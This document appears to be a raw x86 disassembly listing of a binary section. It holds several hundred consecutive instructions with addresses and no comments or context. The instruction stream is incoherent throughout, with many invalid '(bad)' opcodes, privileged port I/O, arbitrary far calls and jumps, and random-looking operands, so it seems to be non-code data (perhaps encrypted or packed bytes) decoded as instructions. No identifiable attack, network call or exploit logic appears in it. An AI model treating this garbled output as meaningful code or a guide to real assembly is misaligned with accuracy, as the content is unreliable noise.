  41df4d:	cli    
  41df4e:	dec    ebp
  41df4f:	repnz in al,dx
  41df51:	cmp    BYTE PTR [edx+0x59c74b4b],0xa3
  41df58:	adc    eax,edx
  41df5a:	hlt    
  41df5b:	push   edx
  41df5c:	pop    ds
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	icebp  
  41df5f:	in     al,0xe9
  41df61:	(bad)  
  41df62:	ins    BYTE PTR es:[edi],dx
  41df63:	jno    0x41dfb0
  41df65:	(bad)  
  41df66:	std    
  41df67:	lods   eax,DWORD PTR ds:[esi]
  41df68:	xchg   BYTE PTR [eax],ch
  41df6a:	xchg   DWORD PTR [esi],eax
  41df6c:	(bad)  
  41df6d:	pop    ecx
  41df6e:	adc    DWORD PTR [esi+0x1e],ebx
  41df71:	iret   
  41df72:	xchg   esp,eax
  41df73:	push   0x2b3dc8f4
  41df78:	mov    bl,0x19
  41df7a:	cmovbe esi,esp
  41df7d:	mov    ebp,0xc6c03ed6
  41df82:	imul   eax,DWORD PTR [ebx],0x9e87caa7
  41df88:	lods   al,BYTE PTR ds:[esi]
  41df89:	imul   eax,DWORD PTR [edx-0x3f684925],0xa42fcf91
  41df93:	xor    eax,0x561d3a2b
  41df98:	nop
  41df99:	fwait
  41df9a:	mov    dl,0xed
  41df9c:	sbb    eax,0x781f1f38
  41dfa1:	jbe    0x41df9a
  41dfa3:	in     al,0x1f
  41dfa5:	sti    
  41dfa6:	push   cs
  41dfa7:	cmp    eax,0x74823e97
  41dfac:	scas   eax,DWORD PTR es:[edi]
  41dfad:	loop   0x41dfba
  41dfaf:	fdivr  DWORD PTR [esi-0x12]
  41dfb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfb3:	sub    dh,bl
  41dfb5:	call   0x39fe:0x6bbe3cc0
  41dfbc:	es jmp 0x80d54a9a
  41dfc2:	inc    ebp
  41dfc3:	or     DWORD PTR ds:0x9b1fa710,esp
  41dfc9:	xchg   DWORD PTR [ecx*8-0x3c2821b1],ebp
  41dfd0:	loop   0x41e03b
  41dfd2:	mov    eax,0x21688728
  41dfd7:	lds    ecx,FWORD PTR ds:0xf1c354db
  41dfdd:	and    al,0x52
  41dfdf:	cdq    
  41dfe0:	dec    esp
  41dfe1:	sub    BYTE PTR [esi-0x6b],bh
  41dfe4:	ins    BYTE PTR es:[edi],dx
  41dfe5:	(bad)  
  41dfe6:	rcr    edx,1
  41dfe8:	ret    
  41dfe9:	ins    BYTE PTR es:[edi],dx
  41dfea:	out    0xb2,eax
  41dfec:	sbb    esi,DWORD PTR [ebx]
  41dfee:	repnz sub DWORD PTR [ebp+0x124d2ea4],esi
  41dff5:	jmp    0x36405f84
  41dffa:	cmp    BYTE PTR [edi+0x5a],al
  41dffd:	ror    BYTE PTR [ebp+edi*2+0x58],0xe0
  41e002:	mov    ds:0x83cf1566,al
  41e007:	pop    ss
  41e008:	inc    eax
  41e009:	add    BYTE PTR [ebx+0x2597463],ch
  41e00f:	adc    eax,0x7085906f
  41e014:	iret   
  41e015:	mov    dh,0x31
  41e017:	outs   dx,BYTE PTR ds:[esi]
  41e018:	call   0x863e:0x9ea53cae
  41e01f:	stc    
  41e020:	dec    ebx
  41e021:	pop    ebx
  41e022:	fadd   DWORD PTR [eax-0x2012155a]
  41e028:	rol    BYTE PTR [eax+0x7f3d4075],1
  41e02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e02f:	mov    al,ds:0x8e411377
  41e034:	and    al,0x4e
  41e036:	xlat   BYTE PTR ds:[ebx]
  41e037:	jbe    0x41e07f
  41e039:	sbb    al,0x12
  41e03b:	fadd   QWORD PTR [ebx-0x3047d490]
  41e041:	mov    bh,0x6
  41e043:	fmul   DWORD PTR [edi+0x61]
  41e046:	stos   DWORD PTR es:[edi],eax
  41e047:	out    dx,eax
  41e048:	dec    esi
  41e049:	or     eax,esp
  41e04b:	mov    eax,ds:0x31c0416a
  41e050:	(bad)  
  41e051:	mov    ebp,0x477674f3
  41e056:	xor    BYTE PTR ds:0xa544cf6a,0xe5
  41e05d:	into   
  41e05e:	inc    esi
  41e05f:	sbb    eax,0x4e827ff
  41e064:	xadd   BYTE PTR [edi-0x29],al
  41e068:	fcom   DWORD PTR [edi-0x304aa0f]
  41e06e:	ret    
  41e06f:	outs   dx,BYTE PTR ds:[esi]
  41e070:	sbb    edi,DWORD PTR [ebp-0x6b]
  41e073:	add    ebp,DWORD PTR [ebx+ebp*8]
  41e076:	sar    BYTE PTR [eax-0x6bf4599f],1
  41e07c:	cmp    DWORD PTR [edx],ecx
  41e07e:	icebp  
  41e07f:	mov    eax,ds:0x715ebc9d
  41e084:	(bad)  
  41e085:	mov    dh,0x2d
  41e087:	pop    edi
  41e088:	inc    ebx
  41e089:	or     BYTE PTR [edi+0x70427069],ch
  41e08f:	cdq    
  41e090:	fstp   DWORD PTR [edx]
  41e092:	call   0x9f20:0x8e941e77
  41e099:	mov    dl,0xa8
  41e09b:	pop    esp
  41e09c:	jo     0x41e077
  41e09e:	mov    bl,0xcc
  41e0a0:	fadd   QWORD PTR [edx+0x75f3fe2]
  41e0a6:	js     0x41e0e0
  41e0a8:	mov    bh,0x71
  41e0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0ab:	movzx  ebp,WORD PTR [edi+0x294c261]
  41e0b2:	pop    es
  41e0b3:	push   ss
  41e0b4:	sbb    bl,ch
  41e0b6:	pusha  
  41e0b7:	jns    0x41e069
  41e0b9:	pop    eax
  41e0ba:	inc    ebx
  41e0bb:	ror    cl,0xd7
  41e0be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0bf:	inc    ecx
  41e0c0:	xchg   edx,eax
  41e0c1:	adc    eax,DWORD PTR [ecx]
  41e0c3:	(bad)  
  41e0c4:	push   edi
  41e0c5:	mov    ds:0xddc984ea,eax
  41e0ca:	mov    ecx,0x5a71b03b
  41e0cf:	jge    0x41e0df
  41e0d1:	mov    ah,0x6d
  41e0d3:	ret    0xdcf8
  41e0d6:	loope  0x41e0dd
  41e0d8:	stc    
  41e0d9:	cmp    edx,DWORD PTR [edx+0x6e]
  41e0dc:	ins    DWORD PTR es:[edi],dx
  41e0dd:	or     DWORD PTR [edi-0x3],esp
  41e0e0:	fdivr  QWORD PTR [esi]
  41e0e2:	sub    al,bl
  41e0e4:	pop    ecx
  41e0e5:	sbb    BYTE PTR [edi],bl
  41e0e7:	jb     0x41e0fa
  41e0e9:	sbb    BYTE PTR [edx+0x5d],dl
  41e0ec:	sub    eax,0xffffffaf
  41e0ef:	and    dl,dl
  41e0f1:	loop   0x41e0cf
  41e0f3:	sti    
  41e0f4:	xchg   edx,eax
  41e0f5:	in     eax,dx
  41e0f6:	repnz cmp DWORD PTR [esi],eax
  41e0f9:	dec    ebp
  41e0fa:	xor    al,0xf9
  41e0fc:	jecxz  0x41e0b6
  41e0fe:	dec    eax
  41e0ff:	xchg   esp,eax
  41e100:	xchg   esi,eax
  41e101:	scas   eax,DWORD PTR es:[edi]
  41e102:	pop    eax
  41e103:	bound  esi,QWORD PTR [ebp+0xc30394c]
  41e109:	or     esi,ecx
  41e10b:	and    ecx,DWORD PTR [esi+0x6c]
  41e10e:	adc    BYTE PTR gs:[esp+ecx*2],al
  41e112:	cwde   
  41e113:	mov    ds:0x50ebdc1d,al
  41e118:	mov    ah,0xc0
  41e11a:	retf   
  41e11b:	push   eax
  41e11c:	add    ecx,DWORD PTR [edi+0x1d]
  41e11f:	xchg   DWORD PTR [eax-0xc],eax
  41e122:	fbld   TBYTE PTR [edx-0x85d391d]
  41e128:	push   esi
  41e129:	(bad)  
  41e12a:	cld    
  41e12b:	(bad)  
  41e12c:	sbb    ecx,DWORD PTR [edx-0x12234d67]
  41e132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e133:	xor    eax,0x82baa6d5
  41e138:	jecxz  0x41e162
  41e13a:	mov    cl,ah
  41e13c:	mov    bl,0xb5
  41e13e:	sub    BYTE PTR [ebp+0x40],dh
  41e141:	popf   
  41e142:	mov    ds:0xb9166796,eax
  41e147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e149:	or     al,0x8f
  41e14b:	add    al,0x3a
  41e14d:	(bad)  
  41e14e:	out    dx,eax
  41e14f:	aad    0xdb
  41e151:	pop    edi
  41e152:	rcr    DWORD PTR [ecx-0x12750139],0xba
  41e159:	dec    ebx
  41e15a:	sbb    ebp,DWORD PTR [edx]
  41e15c:	sbb    BYTE PTR [ebx-0x16],0xb0
  41e160:	xchg   esp,eax
  41e161:	fsub   QWORD PTR [ecx+eax*1-0x2a]
  41e165:	xor    al,0xfd
  41e167:	clc    
  41e168:	test   al,0x33
  41e16a:	mov    cl,0x98
  41e16c:	sbb    bl,BYTE PTR [edx]
  41e16e:	aas    
  41e16f:	call   0x354d:0xfa4661a4
  41e176:	(bad)  
  41e177:	lods   al,BYTE PTR ds:[esi]
  41e178:	cdq    
  41e179:	xor    BYTE PTR [esi+0x7f],bl
  41e17c:	cmp    BYTE PTR [edi-0x316b9599],bl
  41e182:	xchg   esi,eax
  41e183:	cli    
  41e184:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  41e187:	inc    edi
  41e188:	dec    edx
  41e189:	test   eax,0xef2cded0
  41e18e:	sbb    DWORD PTR [ebx],ecx
  41e190:	test   eax,0x8663ff6a
  41e195:	pop    ds
  41e196:	adc    al,0x25
  41e198:	dec    eax
  41e199:	sbb    al,0x33
  41e19b:	mov    ecx,0x81ebc91e
  41e1a0:	call   DWORD PTR [ecx]
  41e1a2:	mov    bl,0xa7
  41e1a4:	(bad)  
  41e1a5:	scas   al,BYTE PTR es:[edi]
  41e1a6:	adc    BYTE PTR [edx],ah
  41e1a8:	adc    BYTE PTR ds:0x75a00b40,0xf0
  41e1af:	mov    ebp,0x5157a44
  41e1b4:	pop    ecx
  41e1b5:	lahf   
  41e1b6:	xchg   BYTE PTR [edi+eiz*4-0x44],ah
  41e1ba:	ins    DWORD PTR es:[edi],dx
  41e1bb:	mov    esi,DWORD PTR [edx-0x35]
  41e1be:	(bad)  [edx]
  41e1c0:	ins    WORD PTR es:[edi],dx
  41e1c2:	adc    dl,ch
  41e1c4:	and    al,0xe1
  41e1c6:	mov    BYTE PTR ds:0xc3834b1,al
  41e1cc:	dec    ebp
  41e1cd:	add    ebp,ebp
  41e1cf:	pop    ss
  41e1d0:	mov    cs,WORD PTR [eax]
  41e1d2:	xor    al,0x36
  41e1d4:	inc    ebp
  41e1d5:	push   eax
  41e1d6:	sub    BYTE PTR [ebp+0xc],0x33
  41e1da:	mov    ch,0x8f
  41e1dc:	jg     0x41e1e6
  41e1de:	fnstcw WORD PTR [edi-0x7cce4cf9]
  41e1e4:	mov    ds:0x29ceb487,eax
  41e1e9:	dec    ebp
  41e1ea:	mov    ah,0xcf
  41e1ec:	pop    esp
  41e1ed:	fiadd  WORD PTR [ecx]
  41e1ef:	leave  
  41e1f0:	xchg   edx,eax
  41e1f1:	push   ecx
  41e1f2:	in     eax,0x70
  41e1f4:	push   0x37
  41e1f6:	adc    DWORD PTR [edx-0x39],esp
  41e1f9:	sar    BYTE PTR [eax],cl
  41e1fb:	push   ss
  41e1fc:	ja     0x41e27b
  41e1fe:	mov    ds:0xd5544ea7,eax
  41e203:	add    edx,DWORD PTR [esi]
  41e205:	sub    ebx,DWORD PTR [ebx]
  41e207:	sub    ebx,esp
  41e209:	int3   
  41e20a:	inc    ebx
  41e20b:	pusha  
  41e20c:	and    dl,BYTE PTR [edi-0x6a]
  41e20f:	ja     0x41e25e
  41e211:	mov    al,ds:0x85b64e1b
  41e216:	frstor ds:0x282b8f15
  41e21c:	out    dx,al
  41e21d:	ffree  st(6)
  41e21f:	int    0xd9
  41e221:	sub    BYTE PTR [edx+0x1b],bh
  41e224:	in     al,dx
  41e225:	dec    edx
  41e226:	rcl    BYTE PTR cs:[ebp-0x80],cl
  41e22a:	daa    
  41e22b:	sub    al,0x68
  41e22d:	inc    esp
  41e22e:	cs jp  0x41e1e8
  41e231:	aaa    
  41e232:	mov    ch,0x21
  41e234:	aas    
  41e235:	inc    edi
  41e236:	ins    DWORD PTR es:[edi],dx
  41e237:	fcmovnbe st,st(0)
  41e239:	mov    dh,0x8e
  41e23b:	aaa    
  41e23c:	ror    DWORD PTR [ebp+0x507ca32a],cl
  41e242:	aas    
  41e243:	jmp    0x41e297
  41e245:	adc    DWORD PTR [edi+0x5],ebx
  41e248:	test   eax,0xd510b484
  41e24d:	psrad  mm5,QWORD PTR [esi+0xa]
  41e251:	mov    ds:0xe019bf49,al
  41e256:	(bad)  
  41e257:	and    dl,BYTE PTR [ebx-0x1a]
  41e25a:	out    0xef,al
  41e25c:	pop    ebx
  41e25d:	xor    eax,0xed9fc070
  41e262:	and    BYTE PTR [esi+0x418bbfe7],ah
  41e268:	pop    ds
  41e269:	pop    es
  41e26a:	pushf  
  41e26b:	push   ecx
  41e26c:	mul    DWORD PTR ds:0xce7bb2fe
  41e272:	pop    ecx
  41e273:	pusha  
  41e274:	fld    TBYTE PTR [eax+0x24c611a]
  41e27a:	or     BYTE PTR [ecx+0x1bebf9dd],cl
  41e280:	and    al,0x12
  41e282:	out    dx,eax
  41e283:	adc    BYTE PTR [ebp+eax*4+0x40],bl
  41e287:	push   0xada7933d
  41e28c:	(bad)  
  41e28d:	in     al,dx
  41e28e:	ret    
  41e28f:	shr    DWORD PTR [edx+ebp*4],0x4d
  41e293:	mov    eax,0xb9ce2346
  41e298:	ror    BYTE PTR [edi-0x27],0x2
  41e29c:	pop    ecx
  41e29d:	xor    DWORD PTR [ecx+0x16c0efd7],0x51
  41e2a4:	sub    edx,DWORD PTR [edx]
  41e2a6:	push   ebp
  41e2a7:	jle    0x41e24a
  41e2a9:	mov    dh,0xfa
  41e2ab:	or     ebp,ebp
  41e2ad:	ja     0x41e241
  41e2af:	push   edx
  41e2b0:	pop    eax
  41e2b1:	and    al,0xaa
  41e2b3:	jmp    DWORD PTR [esi+0x4539003b]
  41e2b9:	xchg   edi,eax
  41e2ba:	xor    BYTE PTR [edi],bh
  41e2bc:	inc    ecx
  41e2bd:	ins    BYTE PTR es:[edi],dx
  41e2be:	xor    al,0x55
  41e2c0:	xchg   ebp,eax
  41e2c1:	ficom  WORD PTR [edi+esi*8-0x70]
  41e2c5:	sbb    eax,DWORD PTR [edi+esi*8+0x53390697]
  41e2cc:	push   ebp
  41e2cd:	pop    edi
  41e2ce:	push   cs
  41e2cf:	sbb    ah,dh
  41e2d1:	pop    eax
  41e2d2:	std    
  41e2d3:	cmp    eax,0x566d564a
  41e2d8:	mov    ds:0x74065397,al
  41e2dd:	ins    DWORD PTR es:[edi],dx
  41e2de:	imul   eax,DWORD PTR [esp+ebp*2-0x23b0d8fa],0xffffff81
  41e2e6:	pop    ebx
  41e2e7:	sahf   
  41e2e8:	mov    edi,0xcab0de6e
  41e2ed:	call   0x91a2:0x96d36db4
  41e2f4:	in     eax,dx
  41e2f5:	mov    WORD PTR [edi],fs
  41e2f7:	push   cs
  41e2f8:	and    BYTE PTR ds:0x4c64a4b1,ah
  41e2fe:	out    dx,eax
  41e2ff:	ficom  WORD PTR [edi-0x59]
  41e302:	add    BYTE PTR [ebp+0x16],dh
  41e305:	mov    ecx,0x793bbb0a
  41e30a:	fs dec esp
  41e30c:	test   BYTE PTR [esi+0x64],al
  41e30f:	sbb    eax,0x47d95a43
  41e314:	jle    0x41e343
  41e316:	(bad)  
  41e317:	dec    ecx
  41e318:	pop    ecx
  41e319:	jp     0x41e2ef
  41e31b:	ret    
  41e31c:	xlat   BYTE PTR ds:[ebx]
  41e31d:	dec    ecx
  41e31e:	sbb    esp,esp
  41e320:	sub    ebx,eax
  41e322:	adc    bh,bl
  41e324:	test   eax,0x347fcb63
  41e329:	mov    ebx,0xb3f0d9a4
  41e32e:	mov    cl,0x57
  41e330:	xor    edi,DWORD PTR [edi-0x5f]
  41e333:	les    esi,FWORD PTR [esi+0x51]
  41e336:	inc    ecx
  41e337:	sbb    ebx,0x12af8397
  41e33d:	cmp    al,0x82
  41e33f:	scas   eax,DWORD PTR es:[edi]
  41e340:	xchg   BYTE PTR [ecx+ebx*1+0x42f96671],al
  41e347:	mov    ch,0x31
  41e349:	mov    edi,0xdb01c46d
  41e34e:	pop    es
  41e34f:	dec    eax
  41e350:	adc    BYTE PTR [edx],dl
  41e352:	hlt    
  41e353:	inc    ebp
  41e354:	mov    ecx,0xd07223e9
  41e359:	aas    
  41e35a:	outs   dx,DWORD PTR ds:[esi]
  41e35b:	pop    edx
  41e35c:	fnsave [esi]
  41e35e:	repnz int 0x8a
  41e361:	xlat   BYTE PTR ds:[ebx]
  41e362:	sbb    al,0x77
  41e364:	loopne 0x41e30c
  41e366:	jl     0x41e3cd
  41e368:	jae    0x41e2f1
  41e36a:	pusha  
  41e36b:	sti    
  41e36c:	test   al,0x79
  41e36e:	imul   ecx,DWORD PTR [eax],0x2
  41e371:	popa   
  41e372:	das    
  41e373:	push   es
  41e374:	fldcw  WORD PTR [eax]
  41e376:	(bad)  
  41e377:	jmp    0x41e375
  41e379:	mov    esi,fs
  41e37b:	sub    ch,BYTE PTR [edi-0x2a572f38]
  41e381:	xor    esp,DWORD PTR [esi+0x7f]
  41e384:	dec    esp
  41e385:	ret    
  41e386:	adc    DWORD PTR [edi-0x375a7329],0x83c25947
  41e390:	add    esp,0x1b99b327
  41e396:	lea    edx,[ebx]
  41e398:	shl    DWORD PTR [esi-0x5d],cl
  41e39b:	jae    0x41e3b0
  41e39d:	aam    0xb6
  41e39f:	mov    ?,WORD PTR ds:0xb1a9ed8d
  41e3a5:	pushf  
  41e3a6:	jmp    0x9a53:0x34c47780
  41e3ad:	std    
  41e3ae:	mov    dl,0x22
  41e3b0:	push   ss
  41e3b1:	and    eax,0x6f9777bb
  41e3b6:	xchg   ebx,eax
  41e3b7:	xlat   BYTE PTR ds:[ebx]
  41e3b8:	fucomi st,st(7)
  41e3ba:	pushf  
  41e3bb:	adc    al,0x32
  41e3bd:	test   esi,esp
  41e3bf:	xchg   ebx,eax
  41e3c0:	addr16 retf 
  41e3c2:	ret    
  41e3c3:	add    DWORD PTR [edi+0x4e],esp
  41e3c6:	mov    edi,0x417cd883
  41e3cb:	into   
  41e3cc:	push   esi
  41e3cd:	pop    ecx
  41e3ce:	xor    eax,0x34ad805f
  41e3d3:	mov    eax,ds:0xf55b01f3
  41e3d8:	shr    BYTE PTR [ebx-0x44622df0],0x59
  41e3df:	mov    ecx,0xd022d7c4
  41e3e4:	ret    
  41e3e5:	mov    dl,0xbc
  41e3e7:	jnp    0x41e445
  41e3e9:	ss push esp
  41e3eb:	sbb    bh,cl
  41e3ed:	cmp    BYTE PTR [eax-0x722099f0],0xe3
  41e3f4:	push   eax
  41e3f5:	imul   eax,DWORD PTR [esi],0xa
  41e3f8:	cmp    DWORD PTR [eax-0x6],0x66
  41e3fc:	out    0x1b,al
  41e3fe:	mov    WORD PTR [ebx],es
  41e400:	(bad)  
  41e401:	es pop ebp
  41e403:	loop   0x41e41d
  41e405:	push   DWORD PTR [edi+0x2df1413e]
  41e40b:	mov    ebp,0x3b3789f
  41e410:	lds    edx,FWORD PTR [ebx]
  41e412:	stos   DWORD PTR es:[edi],eax
  41e413:	mov    cl,0x64
  41e415:	call   0x82c9:0x90574a02
  41e41c:	xor    ebx,DWORD PTR [ebx-0x26d8b82f]
  41e422:	fld    QWORD PTR [ebx]
  41e424:	test   ebp,ecx
  41e426:	int    0xe
  41e428:	(bad)  
  41e429:	push   0x2
  41e42b:	jmp    0x4b0:0x1d7b6fa
  41e432:	mov    cl,0x62
  41e434:	pop    ds
  41e435:	xlat   BYTE PTR ds:[ebx]
  41e436:	or     al,0xd1
  41e438:	into   
  41e439:	(bad)  
  41e43a:	xor    BYTE PTR [eax-0x23],ah
  41e43d:	jg     0x41e479
  41e43f:	ror    DWORD PTR [ebx+0x11],0x28
  41e443:	in     al,0x9
  41e445:	(bad)  
  41e446:	out    0xd2,al
  41e448:	push   ebp
  41e449:	and    bh,BYTE PTR [ecx]
  41e44b:	das    
  41e44c:	mov    ?,WORD PTR [edx+0x669b45f1]
  41e452:	add    edi,DWORD PTR [esi+0x3e]
  41e455:	cmp    ax,0xc870
  41e459:	pop    edx
  41e45a:	lahf   
  41e45b:	fnstenv [ecx-0x4c]
  41e45e:	sub    eax,0x745a4d4b
  41e463:	push   ebp
  41e464:	dec    DWORD PTR [ebx]
  41e466:	jmp    0x23b0:0x5b7ff0f2
  41e46d:	bound  edx,QWORD PTR [ecx+0x1b]
  41e470:	xacquire lock xor WORD PTR ds:[edi-0x6e3f49a9],0x1e
  41e47b:	sbb    al,0x3e
  41e47d:	imul   ebp,DWORD PTR [esi+ebp*2+0x4a],0xffffff98
  41e482:	call   0xb27e:0x796c6570
  41e489:	es out 0x67,al
  41e48c:	sbb    eax,0x750d7788
  41e491:	mov    dh,BYTE PTR [ecx-0x4ab8f617]
  41e497:	mov    ?,ebx
  41e499:	inc    ecx
  41e49a:	sbb    ecx,DWORD PTR [ecx-0x70e58394]
  41e4a0:	and    esp,DWORD PTR [ecx-0x49]
  41e4a3:	mov    edx,0x5ffb4002
  41e4a8:	mov    ?,WORD PTR [esi]
  41e4aa:	(bad)  
  41e4ab:	push   ss
  41e4ac:	stos   DWORD PTR es:[edi],eax
  41e4ad:	popa   
  41e4ae:	and    DWORD PTR ds:[edx+0x33097944],ebx
  41e4b5:	cmp    eax,0xec517b68
  41e4ba:	pusha  
  41e4bb:	repnz jmp FWORD PTR [ebx+esi*8]
  41e4bf:	fild   WORD PTR [ebx-0x32]
  41e4c2:	adc    al,0x67
  41e4c4:	push   es
  41e4c5:	(bad)  
  41e4c6:	xor    eax,DWORD PTR [ecx+0x47]
  41e4c9:	add    eax,0x31b9d893
  41e4ce:	pminsw mm7,mm2
  41e4d1:	jbe    0x41e4a1
  41e4d3:	jae    0x41e4a8
  41e4d5:	cli    
  41e4d6:	mov    eax,ds:0xbc8b3f74
  41e4db:	bound  ebp,QWORD PTR [esi-0x105b6e05]
  41e4e1:	sub    eax,0x3ec4639a
  41e4e6:	iret   
  41e4e7:	mov    edi,0x85689b73
  41e4ec:	popa   
  41e4ed:	mov    ecx,0xb86ff24
  41e4f2:	pop    ss
  41e4f3:	and    DWORD PTR [edx+eax*4-0x7d4609f7],0x63
  41e4fb:	dec    ebx
  41e4fc:	ss add ebp,0x3b
  41e500:	clc    
  41e501:	xor    DWORD PTR [ebx+0x1a7626fd],ebp
  41e507:	push   esp
  41e508:	adc    DWORD PTR [esi+esi*1+0x4cd9a67f],ecx
  41e50f:	jge    0x41e549
  41e511:	and    BYTE PTR [eax+0x54136a2e],ah
  41e517:	mov    dh,0x52
  41e519:	mov    edx,0x7f7ebcad
  41e51e:	fnstenv [ebp+0x60]
  41e521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e523:	mov    fs,WORD PTR [ebx]
  41e525:	add    ebx,DWORD PTR [ebp+0x32]
  41e528:	sub    edx,ecx
  41e52a:	xchg   ecx,eax
  41e52b:	push   edx
  41e52c:	rcr    DWORD PTR [ebx+eiz*2-0x67],cl
  41e530:	icebp  
  41e531:	sbb    DWORD PTR [ecx-0x5b4ec9ac],ebx
  41e537:	push   edi
  41e538:	enter  0xaaee,0xbc
  41e53c:	ja     0x41e56e
  41e53e:	xor    BYTE PTR [ecx],ah
  41e540:	gs imul ecx,esp,0xe
  41e544:	test   dh,dh
  41e546:	cmp    al,0xfd
  41e548:	adc    esi,esi
  41e54a:	loope  0x41e5a5
  41e54c:	xor    eax,0xec7d3360
  41e551:	cwde   
  41e552:	mov    esp,0x1f54f808
  41e557:	mov    esp,0x966dd662
  41e55c:	pusha  
  41e55d:	shl    DWORD PTR [ebx],0x97
  41e560:	add    ch,BYTE PTR [ebx-0x75]
  41e563:	xor    DWORD PTR [esi+eax*2],edi
  41e566:	mov    dh,0xa2
  41e568:	push   edx
  41e569:	xchg   ecx,eax
  41e56a:	pushf  
  41e56b:	cld    
  41e56c:	dec    BYTE PTR ds:0x19a8cc68
  41e572:	retf   0x341e
  41e575:	rcr    ebp,cl
  41e577:	mov    ds:0xb2a1c71,eax
  41e57c:	push   ecx
  41e57d:	cmp    eax,DWORD PTR [ebx+0x60726591]
  41e583:	stos   DWORD PTR es:[edi],eax
  41e584:	add    DWORD PTR [ebp+0x33d3f27e],esp
  41e58a:	mov    ebx,DWORD PTR [ecx-0x34a88e73]
  41e590:	xlat   BYTE PTR ds:[ebx]
  41e591:	sti    
  41e592:	popf   
  41e593:	add    bl,BYTE PTR [ebx-0xe]
  41e596:	xchg   esp,eax
  41e597:	jnp    0x41e543
  41e599:	jbe    0x41e564
  41e59b:	mov    eax,0x96b466bd
  41e5a0:	jmp    0x41e5a2
  41e5a2:	aam    0x88
  41e5a4:	mov    edx,DWORD PTR [esi]
  41e5a6:	retf   0xe48
  41e5a9:	adc    al,bl
  41e5ab:	sahf   
  41e5ac:	out    dx,al
  41e5ad:	ret    0x454
  41e5b0:	cld    
  41e5b1:	div    esi
  41e5b3:	ror    cl,cl
  41e5b5:	xchg   edx,eax
  41e5b6:	in     eax,dx
  41e5b7:	push   ebx
  41e5b8:	or     BYTE PTR [esi+0x1462129d],dh
  41e5be:	mov    ds:0x42df7f02,al
  41e5c3:	cmp    dh,BYTE PTR [ecx]
  41e5c5:	sbb    edx,DWORD PTR [ecx]
  41e5c7:	stos   BYTE PTR es:[edi],al
  41e5c8:	xor    ch,BYTE PTR [ecx-0x2]
  41e5cb:	enter  0xcfd3,0xf1
  41e5cf:	xor    al,0x8b
  41e5d1:	out    0x64,eax
  41e5d3:	ds stc 
  41e5d5:	adc    al,0x97
  41e5d7:	int    0xe2
  41e5d9:	xor    DWORD PTR [ebp+ecx*1-0x35],ebx
  41e5dd:	xor    eax,0xb030541b
  41e5e2:	retf   0xdddd
  41e5e5:	pop    esp
  41e5e6:	push   cs
  41e5e7:	mov    ch,0x8f
  41e5e9:	inc    ebp
  41e5ea:	mov    dl,0x81
  41e5ec:	aas    
  41e5ed:	out    0x10,al
  41e5ef:	scas   eax,DWORD PTR es:[edi]
  41e5f0:	ins    BYTE PTR es:[edi],dx
  41e5f1:	aad    0xe3
  41e5f3:	faddp  st(1),st
  41e5f5:	iret   
  41e5f6:	enter  0xe6d8,0x9
  41e5fa:	mov    edx,0x6d7df983
  41e5ff:	jmp    0xa6572216
  41e604:	mov    ebx,0xcafdf339
  41e609:	loopne 0x41e632
  41e60b:	mov    dh,BYTE PTR [ebp-0x7b]
  41e60e:	xchg   ecx,eax
  41e60f:	loope  0x41e5f0
  41e611:	lods   eax,DWORD PTR ds:[esi]
  41e612:	or     al,bl
  41e614:	ret    0xd747
  41e617:	add    bh,BYTE PTR [ebp+0x300726d]
  41e61d:	sub    BYTE PTR ds:[ebp+esi*2+0xf4ef6f0],ch
  41e625:	sub    BYTE PTR [edx+0x65],0xda
  41e629:	(bad)  
  41e62a:	inc    esi
  41e62c:	add    DWORD PTR [ebp+0x46b94dc9],ecx
  41e632:	popf   
  41e633:	mov    gs:0x48b5da77,eax
  41e639:	mov    edx,0x1e9f1919
  41e63e:	fld    DWORD PTR [ecx-0x12]
  41e641:	in     eax,0xae
  41e643:	pop    ss
  41e644:	loop   0x41e698
  41e646:	hlt    
  41e647:	aad    0x18
  41e649:	mov    cl,0x5b
  41e64b:	mov    ecx,es
  41e64d:	sub    DWORD PTR [ecx+0x55187eaa],edx
  41e653:	daa    
  41e654:	and    DWORD PTR [esi],edx
  41e656:	xchg   BYTE PTR [edx+0x22],dl
  41e659:	cwde   
  41e65a:	jno    0x41e6cb
  41e65c:	fsub   QWORD PTR [edi+0x32]
  41e65f:	mov    bl,0xd4
  41e661:	inc    esi
  41e662:	(bad)  
  41e663:	scas   al,BYTE PTR es:[edi]
  41e664:	ret    
  41e665:	fwait
  41e666:	xchg   DWORD PTR [edi-0x6a68e670],ebp
  41e66c:	or     ebx,ebp
  41e66e:	shl    DWORD PTR [ecx+0x37],cl
  41e671:	mov    dh,0x1b
  41e673:	mov    cl,bh
  41e675:	cmp    eax,0xffffffcc
  41e678:	aad    0xa
  41e67a:	mul    DWORD PTR [ebp+0x14]
  41e67d:	stos   DWORD PTR es:[edi],eax
  41e67e:	adc    BYTE PTR [edi],cl
  41e680:	loopne 0x41e683
  41e682:	lds    ebx,FWORD PTR [ebp-0x39e73c4b]
  41e688:	icebp  
  41e689:	fnstsw WORD PTR [edx-0x30]
  41e68c:	mov    bh,0xf4
  41e68e:	pop    edx
  41e68f:	lahf   
  41e690:	sbb    BYTE PTR ss:[esi],dh
  41e693:	adc    bh,ch
  41e695:	fld    DWORD PTR [esi+ebx*4]
  41e698:	push   esi
  41e699:	mov    ecx,0x2a5a2ff7
  41e69e:	push   edx
  41e69f:	mov    edi,0x45f2a1f4
  41e6a4:	fistp  DWORD PTR [eax]
  41e6a6:	and    BYTE PTR [ebx+0x49],ah
  41e6a9:	sbb    DWORD PTR [edi+0x5b33900e],0xffffffa8
  41e6b0:	mov    eax,0x43ddbcb8
  41e6b5:	or     edi,ecx
  41e6b7:	(bad)  
  41e6b8:	jbe    0x41e6ce
  41e6ba:	xor    ch,BYTE PTR [edx-0x6b249d4c]
  41e6c0:	push   ecx
  41e6c1:	dec    ebx
  41e6c2:	pop    eax
  41e6c3:	sub    eax,0x9ed4f73
  41e6c8:	sub    dl,BYTE PTR [edx]
  41e6ca:	jmp    0xcedf1cfc
  41e6cf:	fs addr16 aam 0x28
  41e6d3:	xor    ebp,ebp
